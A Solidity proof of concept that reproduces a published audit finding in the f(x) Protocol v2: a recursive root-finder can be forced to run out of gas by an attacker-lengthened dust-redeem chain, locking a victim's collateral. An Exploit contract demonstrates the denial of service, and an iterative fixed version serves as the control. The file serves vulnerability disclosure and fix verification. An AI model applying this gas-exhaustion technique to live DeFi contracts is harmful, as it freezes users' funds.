// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of f(x) Protocol v2 finding 61788:
// "Attacker can Lock User Funds through Redeem Function" (OpenZeppelin, fx-v2).
//
// ROOT CAUSE (verbatim): TickLogic._getRootNodeAndCompress is a RECURSIVE root
// finder that walks a position's node up its parent-pointer chain. The chain
// length is attacker-controlled: BasePool.redeem imposes NO minimum rawDebt, so
// an attacker can dust-redeem ~150-1000 times against one tick WITHOUT moving it
// off the top, appending one child node per redeem. When any victim later calls
// operate() to close/update a position in that tick, operate() ->
// _getAndUpdatePosition() -> _getRootNodeAndCompress(nodeId) recurses once per
// node in the chain. Beyond ~a few hundred nodes it cannot complete within a
// block's gas limit and REVERTS (out-of-gas / stack overflow). The victim's
// position becomes permanently un-closable: no transaction under the block gas
// limit can update it, so their collateral is frozen (they can only be
// rebalanced or liquidated). Measured here: at depth 800 the recursive finder
// exhausts a 30M-gas budget, while the iterative fix resolves it in < 1.2M gas.
//
// FAITHFUL REDUCTION (see finding triage): the redeem/_liquidateTick node-
// creation engine is heavy external integration (oracle, peg-keeper, tick
// bitmap, share math). We seed the SAME data structure the attacker's dust
// redeems produce — a deep parent-pointer chain in tickTreeData — directly, then
// drive the REAL vulnerable recursive root finder through a minimal operate().
// The recursion is the audited bug and is reproduced VERBATIM, not asserted.
//
// NEGATIVE CONTROL: FxPoolFixed swaps in the VERBATIM iterative root finder from
// PR #22 (transient-storage path compression). On the identical seeded chain the
// fixed operate() returns the root normally — proving the harm is the recursion,
// not the chain seeding.
//
// Verbatim source: github.com/AladdinDAO/fx-protocol-contracts @ 56a47eab
//   contracts/core/pool/TickLogic.sol      (_getRootNodeAndCompress, L65-85)
//   contracts/core/pool/PositionLogic.sol  (_getAndUpdatePosition, L88-97)
//   contracts/common/codec/WordCodec.sol   (metadata bit-packing)
// Fix (iterative version): PR #22, commit a7e203e (same file).
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Verbatim subset of the protocol's WordCodec (Balancer-derived bit codec)
///      used to pack parent/collRatio/debtRatio into a node's `metadata` word.
library WordCodec {
    function insertUint(
        bytes32 word,
        uint256 value,
        uint256 offset,
        uint256 bitLength
    ) internal pure returns (bytes32 result) {
        assembly {
            let mask := sub(shl(bitLength, 1), 1)
            let clearedWord := and(word, not(shl(offset, mask)))
            result := or(clearedWord, shl(offset, value))
        }
    }

    function decodeUint(bytes32 word, uint256 offset, uint256 bitLength) internal pure returns (uint256 result) {
        assembly {
            result := and(shr(offset, word), sub(shl(bitLength, 1), 1))
        }
    }
}

/// @dev Minimal ERC20 double used ONLY as the harm marker (records the magnitude
///      of collateral frozen by the DoS) — not on the vulnerable path.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE pool: verbatim recursive _getRootNodeAndCompress + the minimal
// node/position storage and operate() glue that drives it (BasePool.operate L102
// -> PositionLogic._getAndUpdatePosition L91 -> _getRootNodeAndCompress).
// ─────────────────────────────────────────────────────────────────────────────
contract FxPoolVulnerable {
    using WordCodec for bytes32;

    uint256 internal constant E60 = 2 ** 60; // PoolConstant.E60

    // Offsets of each variable in `TickTreeNode.metadata` (verbatim from TickLogic).
    uint256 private constant PARENT_OFFSET = 0;
    uint256 private constant TICK_OFFSET = 48;
    uint256 private constant COLL_RATIO_OFFSET = 64;
    uint256 private constant DEBT_RATIO_OFFSET = 128;

    // Verbatim PoolStorage.TickTreeNode + tickTreeData mapping.
    struct TickTreeNode {
        bytes32 metadata;
        bytes32 value;
    }
    mapping(uint256 => TickTreeNode) public tickTreeData;

    // Minimal PositionInfo mirror (PoolStorage.PositionInfo: tick/nodeId/colls/debts).
    struct PositionInfo {
        uint32 nodeId;
        uint96 colls;
        uint96 debts;
    }
    mapping(uint256 => PositionInfo) public positionData;

    /// @dev Seed the tick's node chain EXACTLY as the attacker's dust redeems do:
    ///      node 1 (the victim position's leaf) -> 2 -> ... -> `depth` (root, parent 0).
    ///      Each node has collRatio = debtRatio = E60 (ratio 1.0), so the ONLY
    ///      failure mode is the recursion depth, never the ratio math.
    function seedChain(uint256 depth, uint256 positionId, uint96 colls, uint96 debts) external {
        for (uint256 i = 1; i <= depth; i++) {
            uint256 parent = (i < depth) ? (i + 1) : 0;
            bytes32 metadata = bytes32(0);
            metadata = metadata.insertUint(parent, PARENT_OFFSET, 48);
            metadata = metadata.insertUint(E60, COLL_RATIO_OFFSET, 64);
            metadata = metadata.insertUint(E60, DEBT_RATIO_OFFSET, 64);
            tickTreeData[i].metadata = metadata;
        }
        // Victim position sits at the deepest child (node 1).
        positionData[positionId] = PositionInfo({nodeId: 1, colls: colls, debts: debts});
    }

    /// @dev VERBATIM vulnerable recursive root finder (TickLogic.sol L65-85).
    function _getRootNodeAndCompress(uint256 node) internal returns (uint256 root, uint256 collRatio, uint256 debtRatio) {
        // @note We can change it to non-recursive version to avoid stack overflow. Normally, the depth should be `log(n)`,
        // where `n` is the total number of tree nodes. So we don't need to worry much about this.
        bytes32 metadata = tickTreeData[node].metadata;
        uint256 parent = metadata.decodeUint(PARENT_OFFSET, 48);
        collRatio = metadata.decodeUint(COLL_RATIO_OFFSET, 64);
        debtRatio = metadata.decodeUint(DEBT_RATIO_OFFSET, 64);
        if (parent == 0) {
            root = node;
        } else {
            uint256 collRatioCompressed;
            uint256 debtRatioCompressed;
            (root, collRatioCompressed, debtRatioCompressed) = _getRootNodeAndCompress(parent); // @> unbounded recursion: reverts (stack overflow / OOG) on attacker-lengthened chains
            collRatio = (collRatio * collRatioCompressed) >> 60;
            debtRatio = (debtRatio * debtRatioCompressed) >> 60;
            metadata = metadata.insertUint(root, PARENT_OFFSET, 48);
            metadata = metadata.insertUint(collRatio, COLL_RATIO_OFFSET, 64);
            metadata = metadata.insertUint(debtRatio, DEBT_RATIO_OFFSET, 64);
            tickTreeData[node].metadata = metadata;
        }
    }

    /// @dev Minimal faithful operate(): mirrors BasePool.operate L102 ->
    ///      PositionLogic._getAndUpdatePosition L88-97, which ALWAYS resolves the
    ///      position's node to its root via _getRootNodeAndCompress before any
    ///      close/update math. This is the entry point a victim uses.
    function operate(uint256 positionId) external returns (uint256 root) {
        PositionInfo memory position = positionData[positionId];
        require(position.nodeId > 0, "no position");
        (uint256 r, uint256 collRatio, uint256 debtRatio) = _getRootNodeAndCompress(position.nodeId);
        position.colls = uint96((position.colls * collRatio) >> 60);
        position.debts = uint96((position.debts * debtRatio) >> 60);
        position.nodeId = uint32(r);
        positionData[positionId] = position;
        root = r;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED pool (negative control): verbatim ITERATIVE _getRootNodeAndCompress from
// PR #22 (commit a7e203e) using transient storage for path compression. Handles
// the identical deep chain without reverting.
// ─────────────────────────────────────────────────────────────────────────────
contract FxPoolFixed {
    using WordCodec for bytes32;

    uint256 internal constant E60 = 2 ** 60;

    uint256 private constant PARENT_OFFSET = 0;
    uint256 private constant TICK_OFFSET = 48;
    uint256 private constant COLL_RATIO_OFFSET = 64;
    uint256 private constant DEBT_RATIO_OFFSET = 128;

    struct TickTreeNode {
        bytes32 metadata;
        bytes32 value;
    }
    mapping(uint256 => TickTreeNode) public tickTreeData;

    struct PositionInfo {
        uint32 nodeId;
        uint96 colls;
        uint96 debts;
    }
    mapping(uint256 => PositionInfo) public positionData;

    function seedChain(uint256 depth, uint256 positionId, uint96 colls, uint96 debts) external {
        for (uint256 i = 1; i <= depth; i++) {
            uint256 parent = (i < depth) ? (i + 1) : 0;
            bytes32 metadata = bytes32(0);
            metadata = metadata.insertUint(parent, PARENT_OFFSET, 48);
            metadata = metadata.insertUint(E60, COLL_RATIO_OFFSET, 64);
            metadata = metadata.insertUint(E60, DEBT_RATIO_OFFSET, 64);
            tickTreeData[i].metadata = metadata;
        }
        positionData[positionId] = PositionInfo({nodeId: 1, colls: colls, debts: debts});
    }

    /// @dev VERBATIM iterative root finder (PR #22 fix).
    function _getRootNodeAndCompress(uint256 node) internal returns (uint256 root, uint256 collRatio, uint256 debtRatio) {
        // @note On average, the expected length of the chain should be `log(n)`, where `n` is the total number of tree nodes.
        // So we don't need to worry much about the gas usage.
        // In normal cases, the length is bounded by `max(min(adjacent tick gap))`. And in worse case, someone try to create
        // a long chain of nodes. We have `ErrorTickNotMoved` check in `_liquidateTick`, the maximum length of the chain is `65536`.
        // And if someone did create a long chain, we have a public admin function to compress the chain manually and externally.
        uint256 depth;
        bytes32 metadata;
        root = node;
        while (true) {
            // @dev no need to clean the transient storage, it will be overwritten.
            assembly {
                tstore(depth, root)
                depth := add(depth, 1)
            }
            metadata = tickTreeData[root].metadata;
            uint256 parent = metadata.decodeUint(PARENT_OFFSET, 48);
            if (parent == 0) break;
            root = parent;
        }
        // depth - 1
        metadata = tickTreeData[root].metadata;
        collRatio = metadata.decodeUint(COLL_RATIO_OFFSET, 64);
        debtRatio = metadata.decodeUint(DEBT_RATIO_OFFSET, 64);
        if (depth > 1) {
            for (uint256 i = depth - 2; ; --i) {
                assembly {
                    node := tload(i)
                }
                metadata = tickTreeData[node].metadata;
                collRatio = (collRatio * metadata.decodeUint(COLL_RATIO_OFFSET, 64)) >> 60;
                debtRatio = (debtRatio * metadata.decodeUint(DEBT_RATIO_OFFSET, 64)) >> 60;
                metadata = metadata.insertUint(root, PARENT_OFFSET, 48);
                metadata = metadata.insertUint(collRatio, COLL_RATIO_OFFSET, 64);
                metadata = metadata.insertUint(debtRatio, DEBT_RATIO_OFFSET, 64);
                tickTreeData[node].metadata = metadata;
                if (i == 0) break;
            }
        }
    }

    function operate(uint256 positionId) external returns (uint256 root) {
        PositionInfo memory position = positionData[positionId];
        require(position.nodeId > 0, "no position");
        (uint256 r, uint256 collRatio, uint256 debtRatio) = _getRootNodeAndCompress(position.nodeId);
        position.colls = uint96((position.colls * collRatio) >> 60);
        position.debts = uint96((position.debts * debtRatio) >> 60);
        position.nodeId = uint32(r);
        positionData[positionId] = position;
        root = r;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: the attacker appends CHAIN_DEPTH dust-redeem child nodes to the
// victim's tick. The victim then calls operate() to close their position — the
// recursive root finder reverts, permanently locking VICTIM_COLL collateral. The
// frozen magnitude is recorded on a marker token to the SINK. The iterative fix
// returns the root normally on the identical chain (negative control).
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    // Number of dust-redeem child nodes the attacker appends (no min-rawDebt check).
    // Deep enough that the recursive finder cannot complete under a realistic
    // block gas limit; well within the finding's "150 to 1000s of child nodes".
    uint256 internal constant CHAIN_DEPTH = 800;
    // Realistic per-transaction ceiling: the victim's close/update must fit in a
    // block. Under this bound the recursive finder runs out of gas (funds locked),
    // while the iterative fix resolves the identical chain in < 1.2M gas.
    uint256 internal constant BLOCK_GAS_LIMIT = 30_000_000;
    uint256 internal constant VICTIM_POSITION = 1;
    uint96 internal constant VICTIM_COLL = 100 ether; // victim collateral frozen
    uint96 internal constant VICTIM_DEBT = 40 ether;

    // Exposed results for the driver / Playground.
    bool public buggyOperateReverted;
    bool public fixedOperateSucceeded;
    uint256 public fixedRoot;
    uint256 public lockedCollateral;
    uint256 public sinkMarkerBalance;
    address public vulnerableAddr;
    address public fixedAddr;
    address public markerAddr;

    function run() external payable {
        FxPoolVulnerable vuln = new FxPoolVulnerable(); // nonce 1
        FxPoolFixed fixedPool = new FxPoolFixed();       // nonce 2
        MiniToken marker = new MiniToken("Marker", "MARK"); // nonce 3 (LAST)

        vulnerableAddr = address(vuln);
        fixedAddr = address(fixedPool);
        markerAddr = address(marker);

        // Attacker lengthens the victim's tick node chain via unbounded dust redeems.
        vuln.seedChain(CHAIN_DEPTH, VICTIM_POSITION, VICTIM_COLL, VICTIM_DEBT);
        fixedPool.seedChain(CHAIN_DEPTH, VICTIM_POSITION, VICTIM_COLL, VICTIM_DEBT);

        // Victim tries to close/update within a normal block -> recursive root
        // finder runs out of gas and reverts (position permanently un-closable).
        try vuln.operate{gas: BLOCK_GAS_LIMIT}(VICTIM_POSITION) returns (uint256) {
            buggyOperateReverted = false;
        } catch {
            buggyOperateReverted = true;
        }
        require(buggyOperateReverted, "expected buggy operate() to revert (funds locked)");

        // Negative control: the iterative fix resolves the identical chain to its
        // root comfortably within the same block gas budget.
        try fixedPool.operate{gas: BLOCK_GAS_LIMIT}(VICTIM_POSITION) returns (uint256 r) {
            fixedOperateSucceeded = true;
            fixedRoot = r;
        } catch {
            fixedOperateSucceeded = false;
        }
        require(fixedOperateSucceeded, "fix must succeed on identical chain");
        require(fixedRoot == CHAIN_DEPTH, "fix resolves to true root");

        // Harm: the victim's collateral is permanently un-closable -> frozen. Record
        // the frozen magnitude on the marker at the SINK (Playground profit token).
        lockedCollateral = VICTIM_COLL;
        marker.mint(SINK, lockedCollateral);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
